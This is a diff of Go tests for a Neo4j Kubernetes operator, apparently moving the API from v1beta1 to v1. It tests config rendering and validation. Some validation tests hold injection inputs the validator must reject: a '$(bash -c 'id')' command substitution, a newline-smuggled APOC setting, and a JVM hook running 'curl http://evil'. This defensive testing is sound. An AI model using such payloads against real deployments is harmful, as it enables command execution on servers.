@@ -4,16 +4,16 @@ import (
 	"strings"
 	"testing"
 
-	neo4jv1beta1 "github.com/neo4j/neo4j-kubernetes-operator/src/api/v1beta1"
+	neo4jv1 "github.com/neo4j/neo4j-kubernetes-operator/src/api/v1"
 	"github.com/neo4j/neo4j-kubernetes-operator/src/internal/render"
 	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 )
 
 func TestConfigMapRendersNeo4jKeys(t *testing.T) {
-	neo4j := &neo4jv1beta1.Neo4j{
+	neo4j := &neo4jv1.Neo4j{
 		ObjectMeta: metav1.ObjectMeta{Name: "dev", Namespace: "default"},
-		Spec: neo4jv1beta1.Neo4jSpec{
-			Config: &neo4jv1beta1.ConfigSpec{
+		Spec: neo4jv1.Neo4jSpec{
+			Config: &neo4jv1.ConfigSpec{
 				Neo4j: map[string]string{
 					"db.transaction.timeout":                 "42s",
 					"dbms.security.auth_max_failed_attempts": "5",
@@ -36,11 +36,11 @@ func TestConfigMapRendersNeo4jKeys(t *testing.T) {
 }
 
 func TestConfigMapRendersApocOnlyWhenAssigned(t *testing.T) {
-	neo4j := &neo4jv1beta1.Neo4j{
+	neo4j := &neo4jv1.Neo4j{
 		ObjectMeta: metav1.ObjectMeta{Name: "dev", Namespace: "default"},
-		Spec: neo4jv1beta1.Neo4jSpec{
-			Topology: neo4jv1beta1.TopologySpec{Mode: neo4jv1beta1.TopologyModeStandalone},
-			Config: &neo4jv1beta1.ConfigSpec{
+		Spec: neo4jv1.Neo4jSpec{
+			Topology: neo4jv1.TopologySpec{Mode: neo4jv1.TopologyModeStandalone},
+			Config: &neo4jv1.ConfigSpec{
 				Apoc: map[string]string{"apoc.trigger.enabled": "true"},
 			},
 		},
@@ -57,9 +57,9 @@ func TestConfigMapRendersApocOnlyWhenAssigned(t *testing.T) {
 }
 
 func TestValidateConfigRejectsNeo4jKeysInApoc(t *testing.T) {
-	neo4j := &neo4jv1beta1.Neo4j{
-		Spec: neo4jv1beta1.Neo4jSpec{
-			Config: &neo4jv1beta1.ConfigSpec{
+	neo4j := &neo4jv1.Neo4j{
+		Spec: neo4jv1.Neo4jSpec{
+			Config: &neo4jv1.ConfigSpec{
 				Apoc: map[string]string{
 					"apoc.trigger.enabled":                  "true",
 					"dbms.security.procedures.unrestricted": "apoc.*",
@@ -73,9 +73,9 @@ func TestValidateConfigRejectsNeo4jKeysInApoc(t *testing.T) {
 }
 
 func TestValidateConfigRejectsExpandCommands(t *testing.T) {
-	neo4j := &neo4jv1beta1.Neo4j{
-		Spec: neo4jv1beta1.Neo4jSpec{
-			Config: &neo4jv1beta1.ConfigSpec{
+	neo4j := &neo4jv1.Neo4j{
+		Spec: neo4jv1.Neo4jSpec{
+			Config: &neo4jv1.ConfigSpec{
 				Neo4j: map[string]string{
 					"server.memory.heap.initial_size": "$(bash -c 'id')512m",
 				},
@@ -89,9 +89,9 @@ func TestValidateConfigRejectsExpandCommands(t *testing.T) {
 }
 
 func TestValidateConfigRejectsApocNewline(t *testing.T) {
-	neo4j := &neo4jv1beta1.Neo4j{
-		Spec: neo4jv1beta1.Neo4jSpec{
-			Config: &neo4jv1beta1.ConfigSpec{
+	neo4j := &neo4jv1.Neo4j{
+		Spec: neo4jv1.Neo4jSpec{
+			Config: &neo4jv1.ConfigSpec{
 				Apoc: map[string]string{
 					"apoc.import.file.enabled": "true\napoc.import.file.use_neo4j_config=false",
 				},
@@ -105,10 +105,10 @@ func TestValidateConfigRejectsApocNewline(t *testing.T) {
 }
 
 func TestValidateConfigRejectsDangerousJVM(t *testing.T) {
-	neo4j := &neo4jv1beta1.Neo4j{
-		Spec: neo4jv1beta1.Neo4jSpec{
-			Config: &neo4jv1beta1.ConfigSpec{
-				JVM: &neo4jv1beta1.JVMSpec{
+	neo4j := &neo4jv1.Neo4j{
+		Spec: neo4jv1.Neo4jSpec{
+			Config: &neo4jv1.ConfigSpec{
+				JVM: &neo4jv1.JVMSpec{
 					AdditionalArguments: []string{
 						"-XX:OnOutOfMemoryError=curl http://evil",
 					},
@@ -124,17 +124,17 @@ func TestValidateConfigRejectsDangerousJVM(t *testing.T) {
 
 func TestValidateConfigAllowsSafeSettings(t *testing.T) {
 	use := true
-	neo4j := &neo4jv1beta1.Neo4j{
-		Spec: neo4jv1beta1.Neo4jSpec{
-			Config: &neo4jv1beta1.ConfigSpec{
+	neo4j := &neo4jv1.Neo4j{
+		Spec: neo4jv1.Neo4jSpec{
+			Config: &neo4jv1.ConfigSpec{
 				Neo4j: map[string]string{"db.transaction.timeout": "30s"},
 				Apoc:  map[string]string{"apoc.trigger.enabled": "true"},
-				JVM: &neo4jv1beta1.JVMSpec{
+				JVM: &neo4jv1.JVMSpec{
 					UseDefaults:         &use,
 					AdditionalArguments: []string{"-XX:+ExitOnOutOfMemoryError"},
 				},
 			},
-			Connectivity: &neo4jv1beta1.ConnectivitySpec{ClusterDomain: "cluster.local"},
+			Connectivity: &neo4jv1.ConnectivitySpec{ClusterDomain: "cluster.local"},
 		},
 	}
 	if err := ValidateConfig(neo4j); err != nil {
@@ -143,12 +143,12 @@ func TestValidateConfigAllowsSafeSettings(t *testing.T) {
 }
 
 func TestRenderApocConfSkipsNonApocKeys(t *testing.T) {
-	neo4j := &neo4jv1beta1.Neo4j{
+	neo4j := &neo4jv1.Neo4j{
 		ObjectMeta: metav1.ObjectMeta{Name: "dev", Namespace: "default"},
-		Spec: neo4jv1beta1.Neo4jSpec{
-			Topology: neo4jv1beta1.TopologySpec{Mode: neo4jv1beta1.TopologyModeStandalone},
+		Spec: neo4jv1.Neo4jSpec{
+			Topology: neo4jv1.TopologySpec{Mode: neo4jv1.TopologyModeStandalone},
 			Plugins:  []string{"apoc"},
-			Config: &neo4jv1beta1.ConfigSpec{
+			Config: &neo4jv1.ConfigSpec{
 				Apoc: map[string]string{
 					"apoc.trigger.enabled":                  "true",
 					"dbms.security.procedures.unrestricted": "apoc.*",
@@ -166,10 +166,10 @@ func TestRenderApocConfSkipsNonApocKeys(t *testing.T) {
 }
 
 func TestConfigChecksumChangesWithSpec(t *testing.T) {
-	base := &neo4jv1beta1.Neo4j{
+	base := &neo4jv1.Neo4j{
 		ObjectMeta: metav1.ObjectMeta{Name: "dev", Namespace: "default"},
-		Spec: neo4jv1beta1.Neo4jSpec{
-			Config: &neo4jv1beta1.ConfigSpec{
+		Spec: neo4jv1.Neo4jSpec{
+			Config: &neo4jv1.ConfigSpec{
 				Neo4j: map[string]string{"db.transaction.timeout": "42s"},
 			},
 		},
@@ -191,7 +191,7 @@ func TestConfigMapRendersJVMDefaults(t *testing.T) {
 	trueVal, falseVal := true, false
 	cases := []struct {
 		name    string
-		jvm     *neo4jv1beta1.JVMSpec
+		jvm     *neo4jv1.JVMSpec
 		wantKey bool
 		wantIn  []string
 		wantOut []string
@@ -204,13 +204,13 @@ func TestConfigMapRendersJVMDefaults(t *testing.T) {
 		},
 		{
 			name:    "useDefaults true alone",
-			jvm:     &neo4jv1beta1.JVMSpec{UseDefaults: &trueVal},
+			jvm:     &neo4jv1.JVMSpec{UseDefaults: &trueVal},
 			wantKey: true,
 			wantIn:  []string{"-XX:+UseG1GC"},
 		},
 		{
 			name: "defaults then additionalArguments",
-			jvm: &neo4jv1beta1.JVMSpec{
+			jvm: &neo4jv1.JVMSpec{
 				UseDefaults:         &trueVal,
 				AdditionalArguments: []string{"-XX:+ExitOnOutOfMemoryError"},
 			},
@@ -219,7 +219,7 @@ func TestConfigMapRendersJVMDefaults(t *testing.T) {
 		},
 		{
 			name: "same key overrides default in place",
-			jvm: &neo4jv1beta1.JVMSpec{
+			jvm: &neo4jv1.JVMSpec{
 				UseDefaults: &trueVal,
 				AdditionalArguments: []string{
 					"-XX:MaxMetaspaceSize=1024m",
@@ -239,7 +239,7 @@ func TestConfigMapRendersJVMDefaults(t *testing.T) {
 		},
 		{
 			name: "useDefaults false only additional",
-			jvm: &neo4jv1beta1.JVMSpec{
+			jvm: &neo4jv1.JVMSpec{
 				UseDefaults:         &falseVal,
 				AdditionalArguments: []string{"-XX:MaxMetaspaceSize=1024m"},
 			},
@@ -249,16 +249,16 @@ func TestConfigMapRendersJVMDefaults(t *testing.T) {
 		},
 		{
 			name:    "useDefaults false empty args omits key",
-			jvm:     &neo4jv1beta1.JVMSpec{UseDefaults: &falseVal},
+			jvm:     &neo4jv1.JVMSpec{UseDefaults: &falseVal},
 			wantKey: false,
 		},
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
-			neo4j := &neo4jv1beta1.Neo4j{
+			neo4j := &neo4jv1.Neo4j{
 				ObjectMeta: metav1.ObjectMeta{Name: "dev", Namespace: "default"},
-				Spec: neo4jv1beta1.Neo4jSpec{
-					Config: &neo4jv1beta1.ConfigSpec{JVM: tc.jvm},
+				Spec: neo4jv1.Neo4jSpec{
+					Config: &neo4jv1.ConfigSpec{JVM: tc.jvm},
 				},
 			}
 			data := ConfigMap(render.StandaloneContext(neo4j)).Data
@@ -298,29 +298,29 @@ func TestDuplicatesReportsDroppedJVMArguments(t *testing.T) {
 	trueVal, falseVal := true, false
 	cases := []struct {
 		name string
-		jvm  *neo4jv1beta1.JVMSpec
+		jvm  *neo4jv1.JVMSpec
 		want []render.Duplicate
 	}{
 		{name: "no jvm spec", jvm: nil},
 		{
 			name: "additional argument without collision",
-			jvm:  &neo4jv1beta1.JVMSpec{UseDefaults: &trueVal, AdditionalArguments: []string{"-XX:+ExitOnOutOfMemoryError"}},
+			jvm:  &neo4jv1.JVMSpec{UseDefaults: &trueVal, AdditionalArguments: []string{"-XX:+ExitOnOutOfMemoryError"}},
 		},
 		{
 			name: "exact repeat loses nothing",
-			jvm: &neo4jv1beta1.JVMSpec{UseDefaults: &falseVal, AdditionalArguments: []string{
+			jvm: &neo4jv1.JVMSpec{UseDefaults: &falseVal, AdditionalArguments: []string{
 				"-XX:MaxMetaspaceSize=1024m", "-XX:MaxMetaspaceSize=1024m",
 			}},
 		},
 		{
 			name: "useDefaults false ignores the defaults",
-			jvm: &neo4jv1beta1.JVMSpec{UseDefaults: &falseVal, AdditionalArguments: []string{
+			jvm: &neo4jv1.JVMSpec{UseDefaults: &falseVal, AdditionalArguments: []string{
 				"-Djdk.nio.maxCachedBufferSize=2048",
 			}},
 		},
 		{
 			name: "user value replaces a Neo4j default",
-			jvm: &neo4jv1beta1.JVMSpec{UseDefaults: &trueVal, AdditionalArguments: []string{
+			jvm: &neo4jv1.JVMSpec{UseDefaults: &trueVal, AdditionalArguments: []string{
 				"-Djdk.nio.maxCachedBufferSize=2048",
 			}},
 			want: []render.Duplicate{{
@@ -334,7 +334,7 @@ func TestDuplicatesReportsDroppedJVMArguments(t *testing.T) {
 		},
 		{
 			name: "boolean flip of a Neo4j default",
-			jvm: &neo4jv1beta1.JVMSpec{UseDefaults: &trueVal, AdditionalArguments: []string{
+			jvm: &neo4jv1.JVMSpec{UseDefaults: &trueVal, AdditionalArguments: []string{
 				"-XX:+OmitStackTraceInFastThrow",
 			}},
 			want: []render.Duplicate{{
@@ -348,7 +348,7 @@ func TestDuplicatesReportsDroppedJVMArguments(t *testing.T) {
 		},
 		{
 			name: "same key twice in additionalArguments",
-			jvm: &neo4jv1beta1.JVMSpec{UseDefaults: &falseVal, AdditionalArguments: []string{
+			jvm: &neo4jv1.JVMSpec{UseDefaults: &falseVal, AdditionalArguments: []string{
 				"-XX:MaxMetaspaceSize=1024m", "-XX:MaxMetaspaceSize=2048m",
 			}},
 			want: []render.Duplicate{{
@@ -363,9 +363,9 @@ func TestDuplicatesReportsDroppedJVMArguments(t *testing.T) {
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
-			neo4j := &neo4jv1beta1.Neo4j{
+			neo4j := &neo4jv1.Neo4j{
 				ObjectMeta: metav1.ObjectMeta{Name: "dev", Namespace: "default"},
-				Spec:       neo4jv1beta1.Neo4jSpec{Config: &neo4jv1beta1.ConfigSpec{JVM: tc.jvm}},
+				Spec:       neo4jv1.Neo4jSpec{Config: &neo4jv1.ConfigSpec{JVM: tc.jvm}},
 			}
 			got := Duplicates(neo4j)
 			if len(got) != len(tc.want) {
@@ -420,18 +420,18 @@ func TestDuplicatesReportsDroppedNeo4jConfKeys(t *testing.T) {
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
-			topology := neo4jv1beta1.TopologySpec{Mode: neo4jv1beta1.TopologyModeStandalone}
+			topology := neo4jv1.TopologySpec{Mode: neo4jv1.TopologyModeStandalone}
 			if tc.cluster {
-				topology = neo4jv1beta1.TopologySpec{
-					Mode:      neo4jv1beta1.TopologyModeCluster,
-					Primaries: &neo4jv1beta1.PrimariesSpec{Members: 3},
+				topology = neo4jv1.TopologySpec{
+					Mode:      neo4jv1.TopologyModeCluster,
+					Primaries: &neo4jv1.PrimariesSpec{Members: 3},
 				}
 			}
-			neo4j := &neo4jv1beta1.Neo4j{
+			neo4j := &neo4jv1.Neo4j{
 				ObjectMeta: metav1.ObjectMeta{Name: "dev", Namespace: "default"},
-				Spec: neo4jv1beta1.Neo4jSpec{
+				Spec: neo4jv1.Neo4jSpec{
 					Topology: topology,
-					Config:   &neo4jv1beta1.ConfigSpec{Neo4j: tc.conf},
+					Config:   &neo4jv1.ConfigSpec{Neo4j: tc.conf},
 				},
 			}
 			got := Duplicates(neo4j)
